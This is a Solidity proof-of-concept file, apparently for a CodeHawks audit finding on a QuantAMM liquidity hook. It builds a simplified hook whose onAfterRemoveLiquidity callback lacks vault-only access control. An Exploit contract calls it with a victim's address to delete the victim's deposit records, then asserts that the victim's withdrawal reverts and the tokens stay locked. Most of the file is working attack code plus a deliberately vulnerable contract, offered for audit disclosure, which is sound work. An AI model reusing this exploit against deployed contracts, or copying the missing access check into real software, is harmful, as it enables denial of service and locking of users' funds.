// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  QuantAMM UpliftOnlyExample — onAfterRemoveLiquidity (CodeHawks 2024-12)
    The hook is missing onlyVault. A caller passes the depositor in userData
    and pops every FeeData row. removeLiquidityProportional then reverts
    WithdrawalByNonOwner, and the deposited tokens stay in the hook.
*/

contract BPT {
    string public symbol = "BPT";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

enum RemoveLiquidityKind {
    PROPORTIONAL
}

error WithdrawalByNonOwner(address user, address pool, uint256 amount);

contract Hook {
    struct FeeData {
        uint256 bptAmount;
        uint256 tokenId;
    }

    BPT public immutable token;
    address public pool;
    address public vault;
    bool public immutable onlyFromVault;
    uint256 public nextId;
    mapping(address => mapping(address => FeeData[])) internal feeRows;

    modifier onlyVault() {
        if (onlyFromVault) require(msg.sender == vault, "vault");
        _;
    }

    constructor(BPT _token, address _pool, bool _onlyFromVault) {
        token = _token;
        pool = _pool;
        vault = address(0xCAFE);
        onlyFromVault = _onlyFromVault;
    }

    function feeLength(address user) external view returns (uint256) {
        return feeRows[pool][user].length;
    }

    function addLiquidity(address user, uint256 bptAmount) external {
        require(token.transferFrom(msg.sender, address(this), bptAmount), "pull");
        feeRows[pool][user].push(FeeData({bptAmount: bptAmount, tokenId: ++nextId}));
    }

    function onAfterRemoveLiquidity(
        address router,
        address pool_,
        RemoveLiquidityKind kind,
        uint256 bptAmountIn,
        uint256[] memory userBalances,
        uint256[] memory amountsOutRaw,
        uint256[] memory amountsOutFinal,
        bytes memory userData
    ) public onlyVault returns (bool, uint256[] memory hookAdjustedAmountsOutRaw) {
        router;
        kind;
        userBalances;
        amountsOutFinal;
        require(pool_ == pool, "pool");
        require(userData.length == 20, "user");
        address user;
        assembly {
            user := shr(96, mload(add(userData, 32)))
        }
        uint256 remaining = bptAmountIn;
        FeeData[] storage rows = feeRows[pool][user];
        while (rows.length > 0 && remaining > 0) {
            uint256 amt = rows[rows.length - 1].bptAmount;
            if (amt > remaining) {
                rows[rows.length - 1].bptAmount = amt - remaining;
                remaining = 0;
            } else {
                remaining -= amt;
                // @> VULN: onlyVault is absent, so this pop deletes FeeData for the user encoded by the caller
                rows.pop();
            }
        }
        hookAdjustedAmountsOutRaw = amountsOutRaw;
        return (true, hookAdjustedAmountsOutRaw);
    }

    function removeLiquidityProportional(uint256 bptAmount) external {
        FeeData[] storage rows = feeRows[pool][msg.sender];
        uint256 sum;
        for (uint256 i = 0; i < rows.length; i++) {
            sum += rows[i].bptAmount;
        }
        if (sum < bptAmount) revert WithdrawalByNonOwner(msg.sender, pool, bptAmount);
        uint256 left = bptAmount;
        while (left > 0) {
            uint256 amt = rows[rows.length - 1].bptAmount;
            if (amt > left) {
                rows[rows.length - 1].bptAmount = amt - left;
                left = 0;
            } else {
                left -= amt;
                rows.pop();
            }
        }
        require(token.transfer(msg.sender, bptAmount), "pay");
    }
}

contract Bob {
    function deposit(Hook hook, BPT token, uint256 amount) external {
        token.approve(address(hook), amount);
        hook.addLiquidity(address(this), amount);
    }

    function take(Hook hook, uint256 amount) external returns (bool ok) {
        (ok,) = address(hook).call(abi.encodeWithSignature("removeLiquidityProportional(uint256)", amount));
    }
}

contract Exploit {
    uint256 public constant PER = 10_000 ether;
    uint256 public constant TIMES = 5;

    BPT public token;
    Hook public hook;
    Bob public bob;
    address public pool;
    uint256 public wipedTo;
    bool public removeReverted;
    uint256 public locked;

    constructor() {
        token = new BPT();
        pool = address(new BPT());
        hook = new Hook(token, pool, false);
        bob = new Bob();
    }

    function run() external {
        token.mint(address(bob), PER * TIMES);
        for (uint256 i = 0; i < TIMES; i++) {
            bob.deposit(hook, token, PER);
        }
        uint256 beforeLen = hook.feeLength(address(bob));
        uint256[] memory zeros = new uint256[](2);
        bytes memory userData = abi.encodePacked(address(bob));
        (bool wiped,) = address(hook).call(
            abi.encodeWithSignature(
                "onAfterRemoveLiquidity(address,address,uint8,uint256,uint256[],uint256[],uint256[],bytes)",
                address(this),
                pool,
                uint8(RemoveLiquidityKind.PROPORTIONAL),
                PER * TIMES,
                zeros,
                zeros,
                zeros,
                userData
            )
        );
        require(wiped, "wipe");
        wipedTo = hook.feeLength(address(bob));
        bool took = bob.take(hook, PER);
        removeReverted = !took;
        locked = token.balanceOf(address(hook));
        require(beforeLen == TIMES, "rows");
        require(wipedTo == 0, "wiped");
        require(removeReverted, "remove");
        require(locked == PER * TIMES, "locked");
        require(token.balanceOf(address(bob)) == 0, "bob");
    }
}
